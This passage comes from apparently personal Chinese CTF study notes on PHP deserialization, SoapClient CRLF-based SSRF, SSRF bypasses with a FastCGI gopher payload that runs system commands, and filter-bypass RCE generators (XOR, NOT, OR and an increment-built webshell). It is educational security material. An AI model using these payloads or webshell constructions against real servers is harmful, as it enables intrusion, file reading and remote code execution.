session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的\n\nsession.serialize_handler定义的引擎共有三种：\n|处理器名称|存储格式|\n|----|----|\n|php|键名 + 竖线 + 经过serialize()函数序列化处理的值|\n|php_binary|键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|\n|php_serialize|经过serialize()函数序列化处理的数组|\n\n\n当`php`和`php_serialize`这两个处理区混合起来使用，就会出现`session`反序列化漏洞。原因是`php_serialize`存储的反序列化字符可以引用`|`，如果这时候使用`php`处理器的格式取出`$_SESSION`的值，`|`会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞\n\n\n## $_SESSION变量可控\n\n例子\n```php\n//1.php\n<?php\nerror_reporting(0);\nini_set('session.serialize_handler','php_serialize');\nsession_start();\n$_SESSION['session'] = $_GET['session'];\nvar_dump($_SESSION);\n\n\n//2.php\n<?php\nerror_reporting(0);\nini_set('session.serialize_handler','php');\nsession_start();\nclass test{\n\tpublic $name;\n\tfunction __wakeup(){\n\t\techo $this->name;\n\t}\n}\n```\n\n先在`1.php`传入`?session=lewiserii`\n\n`session`的内容，因为1.php页面用的是`php_serialize`引擎，所以是序列化处理的数组的形式\n\n![](/img/summary/php_unserialize-1.png)\n\n\n而2.php用的是`php`引擎，在可控点传入`|`+`序列化字符串`，然后再次访问2.php调用session值的时候会触发\n\n传入`?session=|O:4:\"test\":1:{s:4:\"name\";s:9:\"lewiserii\";}`后，文件中的值就变成了下图中的值\n\n![](/img/summary/php_unserialize-2.png)\n\n再次访问2.php，发现成功反序列化，修改了`$name`\n\n![](/img/summary/php_unserialize-3.png)\n\n>总结：由于1.php是使用php_serialize引擎处理，因此只会把'|'当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到'|'时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对'|'后的值进行反序列化处理。\n\n\n## $_SESSION变量不可控\n\n当`$_SESSION`不能直接控制时，可以借助`PHP_SESSION_UPLOAD_PROGRESS`来完成反序列化\n\n关于`PHP_SESSION_UPLOAD_PROGRESS`的介绍可以参考我的另一篇文章[session.upload_progress文件包含](https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93.html#session-upload-progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)\n\n\n这里用ctfshow的一道新春题的前半部分作例子\n\n```php\n<?php\ninclude(\"class.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\nini_set(\"session.serialize_handler\", \"php\");\nsession_start();\n\nif (isset($_GET['phpinfo']))\n{\n    phpinfo();\n}\nif (isset($_GET['source']))\n{\n    highlight_file(\"class.php\");\n}\n\n$happy=new Happy();\n$happy();\n?>\n```\n\nclass.php\n\n```php\n<?php\n    class Happy {\n        public $happy;\n        function __construct(){\n                $this->happy=\"Happy_New_Year!!!\";\n\n        }\n        function __destruct(){\n                $this->happy->happy;\n\n        }\n        public function __call($funName, $arguments){\n                die($this->happy->$funName);\n        }\n\n        public function __set($key,$value)\n        {\n            $this->happy->$key = $value;\n        }\n        public function __invoke()\n        {\n            echo $this->happy;\n        }\n\n\n    }\n\n    class _New_{\n        public $daniu;\n        public $robot;\n        public $notrobot;\n        private $_New_;\n        function __construct(){\n                $this->daniu=\"I'm daniu.\";\n                $this->robot=\"I'm robot.\";\n                $this->notrobot=\"I'm not a robot.\";\n\n        }\n        public function __call($funName, $arguments){\n                echo $this->daniu.$funName.\"not exists!!!\";\n        }\n\n        public function __invoke()\n        {\n            echo $this->daniu;\n            $this->daniu=$this->robot;\n            echo $this->daniu;\n        }\n        public function __toString()\n        {\n            $robot=$this->robot;\n            $this->daniu->$robot=$this->notrobot;\n            return (string)$this->daniu;\n\n        }\n        public function __get($key){\n               echo $this->daniu.$key.\"not exists!!!\";\n        }\n\n }\n    class Year{\n        public $zodiac;\n         public function __invoke()\n        {\n            echo \"happy \".$this->zodiac.\" year!\";\n\n        }\n         function __construct(){\n                $this->zodiac=\"Hu\";\n        }\n        public function __toString()\n        {\n                $this->show();\n\n        }\n        public function __set($key,$value)#3\n        {\n            $this->$key = $value;\n        }\n\n        public function show(){\n            die(file_get_contents($this->zodiac));\n        }\n        public function __wakeup()\n        {\n            $this->zodiac = 'hu';\n        }\n\n    }\n?>\n```\n\n先构造pop链\n`O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:5:\"/f1ag\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}`\n\n\n看下phpinfo中关于session的信息，可以知道当前index.php用的是`php`引擎，其他页面默认用`php_serialize`引擎，且`session.upload_progress.cleanup=Off`，意味着php不会立即清空对应的session文件，就不用进行条件竞争\n\n![](/img/summary/php_unserialize-4.png)\n\n\n构造`POST`表单，提交传入序列化字符串\n\n```html\n<form action=\"http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"lewiserii\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n因为要放到`filename`中的双引号中，所以这里要转义一下双引号，在拼接上`|`，注意一定要带上`PHPSESSID`\n\n![](/img/summary/php_unserialize-5.png)\n\n\n>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename\n\n\n# php原生类反序列化\n\n如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化\n\n\n## 原生文件操作类\n\n**可遍历目录类：**\n```php\nDirectoryIterator 类\nFilesystemIterator 类\nGlobIterator 类\n```\n\nFilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。\n\nGlobIterator 类与前两个类的作用与使用方法相似，但与上面略不同的是其行为类似于glob()，可以通过模式匹配来寻找文件路径。\n\n```php\n$dir=new DirectoryIterator(\"/\");\necho $dir;\n\n$dir=new FilesystemIterator(\"/\");\necho $dir;\n\n//也可以与glob://协议配合使用来查找文件\n$dir=new DirectoryIterator(\"glob:///*flag*\");\necho $dir;\n\n$dir=new FilesystemIterator(\"glob:///*flag*\");\necho $dir;\n\n//GlobIterator无需借助glob协议即可搜索全局文件\n$dir=new GlobIterator(\"/*flag*\");\necho $dir;\n```\n\n**可读取文件类**\n```php\nSplFileObject 类\n```\n\nSplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等\n\n```php\n//读取一个文件的一行\n$context = new SplFileObject('/etc/passwd');\necho $context;\n\n//读取多行需要遍历或者使用伪协议\n$context = new SplFileObject('/etc/passwd');\nforeach($context as $f){\n    echo($f);\n}\n\n$context = new SplFileObject('php://filter/convert.base64-encode/resource=/etc/passwd');\necho $context;\n```\n\n\n\n\n## SoapClient反序列化与ssrf\n\n首先需要了解什么是soap\nsoap，是webService三要素(SOAP、WSDL、UDDI)之一\n\n```text\nSOAP: 基于HTTP协议，采用XML格式，用来描述传递信息的格式。\n\nWSDL: 用来描述如何访问具体的服务。（相当于说明书）\n\nUDDI: 用户自己可以按UDDI标准搭建UDDI服务器，用来管理，分发，查询WebService 。其他用户可以自己注册发布WebService调用。（现在基本废弃）\n```\n\n简单来说就是soap是一种基于http的传输协议，可以发起请求来访问远程服务\n\n[php官方手册](https://www.php.net/manual/zh/class.soapclient.php)中对soapclient的解释如下\n\n```php\nclass SoapClient {\n/* 属性 */\nprivate ?string $uri = null;\nprivate ?int $style = null;\nprivate ?int $use = null;\nprivate ?string $location = null;\nprivate bool $trace = false;\nprivate ?int $compression = null;\nprivate ?resource $sdl = null;\nprivate ?resource $typemap = null;\nprivate ?resource $httpsocket = null;\nprivate ?resource $httpurl = null;\nprivate ?string $_login = null;\nprivate ?string $_password = null;\nprivate bool $_use_digest = false;\nprivate ?string $_digest = null;\nprivate ?string $_proxy_host = null;\nprivate ?int $_proxy_port = null;\nprivate ?string $_proxy_login = null;\nprivate ?string $_proxy_password = null;\nprivate bool $_exceptions = true;\nprivate ?string $_encoding = null;\nprivate ?array $_classmap = null;\nprivate ?int $_features = null;\nprivate int $_connection_timeout;\nprivate ?resource $_stream_context = null;\nprivate ?string $_user_agent = null;\nprivate bool $_keep_alive = true;\nprivate ?int $_ssl_method = null;\nprivate int $_soap_version;\nprivate ?int $_use_proxy = null;\nprivate array $_cookies = [];\nprivate ?array $__default_headers = null;\nprivate ?SoapFault $__soap_fault = null;\nprivate ?string $__last_request = null;\nprivate ?string $__last_response = null;\nprivate ?string $__last_request_headers = null;\nprivate ?string $__last_response_headers = null;\n/* 方法 */\npublic __construct(?string $wsdl, array $options = [])\npublic __call(string $name, array $args): mixed\npublic __doRequest(\n    string $request,\n    string $location,\n    string $action,\n    int $version,\n    bool $oneWay = false\n): ?string\npublic __getCookies(): array\npublic __getFunctions(): ?array\npublic __getLastRequest(): ?string\npublic __getLastRequestHeaders(): ?string\npublic __getLastResponse(): ?string\npublic __getLastResponseHeaders(): ?string\npublic __getTypes(): ?array\npublic __setCookie(string $name, ?string $value = null): void\npublic __setLocation(?string $location = null): ?string\npublic __setSoapHeaders(SoapHeader|array|null $headers = null): bool\npublic __soapCall(\n    string $name,\n    array $args,\n    ?array $options = null,\n    SoapHeader|array|null $inputHeaders = null,\n    array &$outputHeaders = null\n): mixed\n}\n```\n\n先从手册中看soap的构造方法，可以看到有两个参数，第一个参数`$wsdl`用来指明是否为wsdl模式，第二个参数`$options`是一个数组。\n当在第一个参数中指明了wsdl模式后，第二个参数是可选的，可以没有；当第一个参数设置为非wsdl模式后，第二个参数中必须设置uri和location选项。location就是目标url，uri是soap服务的命令空间\n\n![](/img/summary/php_unserialize-6.png)\n\n\n再看__call()方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向location中的目标URL发送一个soap请求\n\n```php\n<?php\n$a = new SoapClient(null,array('uri'=>'aaa','location'=>'http://20.2.129.79:7777'));\n$a->a();\n```\n\n在vps上监听对应的端口\n\n![](/img/summary/php_unserialize-7.png)\n\n可以接收到一个post请求，并且`SOAPAction`的值明显是可控的，那么利用crlf我们就能控制数据包了\n\n比如插入一个cookie\n```php\n<?php\n$a = new SoapClient(null,array('uri'=>'aaa^^Cookie: test=123^^','location'=>'http://20.2.129.79:7777'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\r\\n\",$b);\n\n$c = unserialize($b);\n$c->a();\n?>\n```\n\n![](/img/summary/php_unserialize-8.png)\n\n\n但是对于POST数据包，还存在一个问题，即Content-Type的值，默认是text/xml，我们修改的SOAPAction在Content-Type的下面，无法控制Content-Type，也就不能控制POST的数据\n\n在header里User-Agent在Content-Type前面，手册中也提到了如何设置User-Agent，我们可以在User-Agent中注入crlf，从而控制Content-Type的值\n\n![](/img/summary/php_unserialize-9.png)\n\n```php\n<?php\n$post_data = \"data=abc\";\n$a = new SoapClient(null,array('user_agent'=>'Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: '.strlen($post_data).'^^^^'.$post_data,'uri'=>'aaa','location'=>'http://20.2.129.79:7777'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\r\\n\",$b);\n\n$c = unserialize($b);\n$c->a();\n//echo urlencode($b);\n?>\n```\n\n还需要在结尾设置一个Content-Length，一方面对于post包是必须的，另一方面还能让多余的数据丢弃，不影响我们设定的值\n\n![](/img/summary/php_unserialize-10.png)\n\n这样就能实现soapclient+crlf组合拳攻击ssrf了\n\n\n<hr>\n\n参考文章:\n[由浅入深理解PHP反序列化漏洞](https://blog.csdn.net/mochu7777777/article/details/106909777)\n[[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692)\n[PHP-反序列化（超细的）](https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/)","tags":["总结","php","反序列化"],"categories":["总结"]},{"title":"ssrf学习总结","url":"/posts/76604b1a/","content":"\n# ssrf #\n\n服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n\n\n\n# 危险函数 #\n\n\n下面是几个可能会存在SSRF的服务器使用的函数：\n```text\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。\nreadfile()：输出一个文件的内容。\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接。\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。\nfopen()：打开一个文件文件或者 URL。\n```\n\nexample:\n```php\n<?php\n$url=$_POST['url'];\n$ch=curl_init($url);  //创造一个curl资源\ncurl_setopt($ch, CURLOPT_HEADER, 0); //设置url和相应的选项\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch); // 抓取url并将其传递给浏览器\ncurl_close($ch); //关闭curl资源\necho ($result);\n?>\n```\n\n# 常用协议 #\n\n\n## http ##\n\nhttp协议用于访问内网资源/扫描内网存活主机\n\n![](/img/summary/ssrf-1.png)\n\n\n## dict ##\n\n可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息\n\n\nexample:\n`dict://127.0.0.1:6379 //探测redis是否存活`\n\n\n\n## file ##\n\nfile协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看\n\n![](/img/summary/ssrf-2.png)\n\n## gopher ##\n\n格式：`gopher://<host>:<port>/<gopher-path>_<TCP数据流>`\n\n如果发起`post`请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的`&`也需要进行`URL`编码\n\n\n![](/img/summary/ssrf-3.png)\n\n通过脚本转换\n```python\nimport urllib.parse\npayload =\\\n\"\"\"POST /test.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\ntest=1\n\"\"\"\n\n#注意后面一定要有回车，回车结尾表示http请求结束\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)       # 这里因为是GET请求所以要进行两次url编码\n```\n\n# 利用方式 #\n\n攻击内网`Redis`，`FastCGI`，`MySql`等服务\n\n[浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)\n\n通常会利用[Gopherus](https://github.com/tarunkant/Gopherus)等工具\n\n```text\nMySQL (Port-3306)\nPostgreSQL(Port-5432)\nFastCGI (Port-9000)\nMemcached (Port-11211)\n    If stored data is getting De-serialized by:\n        Python\n        Ruby\n        PHP\nRedis (Port-6379)\nZabbix (Port-10050)\nSMTP (Port-25)\n```\n\n## ssrf打php-fpm\n\n```bash\nroot@lewiserii:~/Gopherus-master# python2 gopherus.py --exploit fastcgi\n\n\n  ________              .__\n /  _____/  ____ ______ |  |__   ___________ __ __  ______\n/   \\  ___ /  _ \\\\____ \\|  |  \\_/ __ \\_  __ \\  |  \\/  ___/\n\\    \\_\\  (  <_> )  |_> >   Y  \\  ___/|  | \\/  |  /\\___ \\\n \\______  /\\____/|   __/|___|  /\\___  >__|  |____//____  >\n        \\/       |__|        \\/     \\/                 \\/\n\n                author: $_SpyD3r_$\n\nGive one file name which should be surely present in the server (prefer .php file)\nif you don't know press ENTER we have default one:  index.php\nTerminal command to run:  ls /\n\nYour gopher link is ready to do SSRF:\n\ngopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n```\n\n传入时记得将生成的payload下划线后面的数据进行url编码\n\n\n\n\n\n# bypass #\n\n## ip限制 ##\n\n例如限制了`127/172`\n\n```text\n进制转换\n10进制 http://2130706433\n8进制 http://017700000001\n16进制  http://0x7F000001\n\n长度限制\nhost<5\nurl=http://0/flag.php\nurl=http://127.1/flag.php\n\nhost<3\nurl=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1\n```\n\n## url限制 ##\n\n>解析到内网的域名\n\n`xip.io`、`xip.name`、`nip.io`、`sslip.io`等\n\n```text\n192.168.0.1.xip.io >>> 192.168.0.1\nlocalhost >>> 127.0.0.1\n```\n\n>利用@转跳\n\n```text\nhttp://www.baidu.com@10.10.10.10 >>> http://10.10.10.10\n```\n\n>利用句号\n\n```text\n127。0。0。1  >>>  127.0.0.1\n```\n\n>利用IPv6[::]\n\n```text\nhttp://[::]:80/  >>>  http://127.0.0.1\nhttp://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用\n```\n\n>利用短网址\n\n不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制\n\n\n## 302跳转 ##\n\nvps上放个php\n```php\n<?php\nheader(\"Location:http://127.0.0.1/flag.php\");\n```\n\n或者\n```php\n<?php\n$schema = $_GET['s'];\n$ip     = $_GET['i'];\n$port   = $_GET['p'];\n$query  = $_GET['q'];\nif(empty($port)){\n    header(\"Location: $schema://$ip/$query\");\n} else {\n    header(\"Location: $schema://$ip:$port/$query\");\n}\n```\n\n## enclosed alphanumerics 绕过 ##\n\n一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。\n\n```text\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n```\n\n## DNS重绑定 ##\n\n[从0到1认识DNS重绑定攻击](https://xz.aliyun.com/t/7495)","tags":["总结","ssrf"],"categories":["总结"]},{"title":"RCE总结-代码执行","url":"/posts/de69952b/","content":"\n\n# 代码执行函数\n\n`eval()`，`assert()`，`preg_replace()`，`create_function()`，`array_map()`，`call_user_func()`，`call_user_func_array()`，`array_filter()`，`uasort()`，`array_walk_recursive`等\n\n\n# 查看可用字符\n\n将题目的正则输入后即可得到可用的符号\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n    if (!preg_match(\"/[a-zA-Z0-9#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",chr($i))){\n        echo chr($i).\" \";\n    }\n}\n```\n\n\n# disable_functions绕过\n\n可以参考我写的另一篇总结：[绕过disable_fuctions的方法总结](../5f3ac2d3)\n\n![](/img/summary/rce-16.png)\n\n小trick：`get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);`\n\n# 标签闭合绕过\n\n```php\nif(!preg_match(\"/\\?|\\;/\",$code)){\n    eval(\"?>\".$code);\n}\n```\n\n闭合了标签，那就造一个新的标签`<script language=\"php\">system('tac /f*')</script>`\n\n\n小trick：`</script>结束标签自带一个;`\n\n\n# 标签闭合+长度限制\n\n```php\nif(strlen($code)<=13){\n    eval(\"?>\".$code);\n}\n```\n\n构造一个小于13位的参数：``<?`$_GET[2]`;``\n\n然后可以利用`&2`传入反弹shell的命令等操作\n\n\n或者在特定版本下可以用`%0a`绕过注释符号的闭合\n\n\n# 无字母数字代码执行\n\n也是很经典的一类题目，参数中不能出现字母和数字\n思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行\n\n```php\n$code=$_GET['code'];\nif(preg_match('/[a-z0-9]/i',$code)){\n    die('hacker');\n}\neval($code);\n```\n\n## 异或xor\n\n在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：`1^1=0,1^0=1,0^1=1,0^0=0`，简单的来说就是相同为零，不同为一\n\n例如`(\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")`，异或后得到`system`\n\n![](/img/summary/rce-17.png)\n\n\nyu师傅的脚本，用来生成一个字典\n\n```php\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n        for ($j=0; $j <256 ; $j++) {\n\n                if($i<16){\n                        $hex_i='0'.dechex($i);\n                }\n                else{\n                        $hex_i=dechex($i);\n                }\n                if($j<16){\n                        $hex_j='0'.dechex($j);\n                }\n                else{\n                        $hex_j=dechex($j);\n                }\n                $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可\n                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                                        echo \"\";\n    }\n\n                else{\n                $a='%'.$hex_i;\n                $b='%'.$hex_j;\n                $c=(urldecode($a)^urldecode($b));\n                if (ord($c)>=32&ord($c)<=126) {\n                        $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n                }\n        }\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n```\n\n然后生成payload\n\n```python\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\n# import requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n\n```\n\n\n然后用`($a)();`的形式执行代码即可，但是要注意`PHP7`前是不允许用`($a)();`这样的方法来执行动态函数的\n\n补充：`PHP>8`就不支持将没有引号包裹的字符解析为对应字符串了，`xx^yy`->`'xx'^'yy'`，这里`x  y`代表`ascii`大于`128`的值\n\n\n## 取反\n\n例子\n```\n%8C-10001100\n逐位取反\n%73-01110011\n```\n\n利用php的取反符号`~`来构造任意字母\n\nyu师傅脚本\n```php\n<?php\n//在命令行中运行\n/*author yu22x*/\n\nfwrite(STDOUT,'[+]your function: ');\n$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN));\nfwrite(STDOUT,'[+]your command: ');\n$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN));\necho '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';\n```\n\n## 或or\n\n原理与异或一致，利用符号`|`来构造\n\n或运算就是有一为一，都是零就是零，比如说`3|10`，就是`0011|1010`，结果为`1011`\n\n\n脚本\n```php\n<?php\n\n/* author yu22x */\n\n$myfile = fopen(\"or_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n        for ($j=0; $j <256 ; $j++) {\n\n                if($i<16){\n                        $hex_i='0'.dechex($i);\n                }\n                else{\n                        $hex_i=dechex($i);\n                }\n                if($j<16){\n                        $hex_j='0'.dechex($j);\n                }\n                else{\n                        $hex_j=dechex($j);\n                }\n                $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可\n                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                                        echo \"\";\n    }\n\n                else{\n                $a='%'.$hex_i;\n                $b='%'.$hex_j;\n                $c=(urldecode($a)|urldecode($b));\n                if (ord($c)>=32&ord($c)<=126) {\n                        $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n                }\n        }\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n```\n\n```python\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"or_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n\n\n```\n\n\n## 自增\n\n利用PHP中的[递增/递减运算符](https://www.php.net/manual/zh/language.operators.increment.php)，也就是说`'a'++ => 'b'`\n\n所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n\n当php强制输出数组时，数组会被转换成字符串`Array`，就可以拿到`A`（PHP函数是大小写不敏感）\n\n![](/img/summary/rce-18.png)\n\n一个通过`Array`构造出`$_POST[__]($_POST[_]);`的例子\n\n```php\n<?php\n$_=[].'';//Array\n$_=$_[''=='$'];//A\n$____='_';//_\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//P\n$____.=$__;//_P\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O\n$____.=$__;//_PO\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S\n$____.=$__;//_POS\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T\n$____.=$__;//_POST\n$_=$____;//_POST\n\n$$_[__]($$_[_]);//$_POST[__]($_POST[_]);\n\n\n//注意编码\n//$_=[].'';$_=$_[''=='$'];$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$____;$$_[__]($$_[_]);&__=system&_=ls\n```\n\n通过`Array`构造出`($_GET[_])($_GET[__])`的例子\n\n```php\n$_=[]._;$__=$_['!'=='='];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_='_'.$___;($$_[_])($$_[__]);\n\n?_=system&__=ls\n```\n\n### 自增长度限制\n\n如果出现了对长度的限制，那么就需要缩短自增的过程，比如从`b`自增到`g`，肯定要比`a`自增到`g`的过程短。\n\n在php中存在两种数据类型\n\n```\nNaN（Not a 